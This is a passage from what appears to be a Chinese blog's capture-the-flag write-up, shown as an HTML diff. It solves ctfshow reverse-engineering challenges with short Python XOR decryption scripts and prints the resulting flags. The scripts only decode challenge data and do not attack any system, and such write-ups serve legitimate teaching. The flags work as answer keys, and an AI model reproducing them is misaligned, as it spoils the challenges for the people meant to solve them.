+ b&#39;\xda&#39;, b&#39;\xf9&#39;, &#39;\x1c&#39;, &#39;&amp;&#39;, &#39;5&#39;, &quot;&#39;&quot;, b&#39;\xda&#39;, b&#39;\xd4&#39;, b&#39;\xd1&#39;, &#39;\x0b&#39;,
+ b&#39;\xc7&#39;, b&#39;\xc7&#39;, &#39;\x1a&#39;, b&#39;\x90&#39;, &#39;D&#39;, b&#39;\xa1&#39;]
+flag = decrypt(code)
+print(flag)
+</code></pre>
+<pre><code>ctfshow&#123;Just_F00l&#39;s_D@y_R3_Ch3ck-in!&#125;
+</code></pre>
+<h2 id="easy-cc"><a href="#easy-cc" class="headerlink" title="easy_cc"></a>easy_cc</h2><p>ida打开文件，根据伪代码写出解密脚本</p>
+<pre><code class="python">hex_str = &quot;08111f425a5c1c1e1a526d410e3a1e5e5d573402165e561216&quot;
+key = &quot;key123&quot;
+
+# Convert hex string to bytes
+bytes_str = bytes.fromhex(hex_str)
+
+# Convert key to bytes
+key_bytes = bytes(key, &#39;utf-8&#39;)
+
+# XOR bytes with key
+flag_bytes = bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(bytes_str)])
+
+# Convert bytes to string
+flag = flag_bytes.decode()
+
+print(flag)
+</code></pre>
+<pre><code>ctfshow&#123;cc_re_good_good!&#125;
+</code></pre>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至1004454362@qq.com </span>
